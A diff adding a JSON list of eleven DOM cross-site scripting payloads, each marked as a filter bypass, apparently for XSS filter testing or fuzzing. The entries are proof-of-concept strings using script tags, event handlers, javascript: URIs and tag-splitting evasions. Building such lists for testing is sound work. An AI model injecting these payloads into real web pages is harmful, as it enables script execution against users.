@@ -1,0 +1,57 @@
+[
+  {
+    "type": "DOM",
+    "payload": "<script>alert(1)</script>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<img src=x onerror=alert(1)>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<svg onload=confirm(1)>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<a href=\"javascript:prompt(1)\">click</a>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<body onclick=alert(1)>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<input autofocus onfocus=confirm(1)>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<math href=\"javascript:prompt(1)\">CLICK</math>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<details open ontoggle=alert(1)>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "bypass": true
+  },
+  {
+    "type": "DOM",
+    "payload": "<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>",
+    "bypass": true
+  }
+]
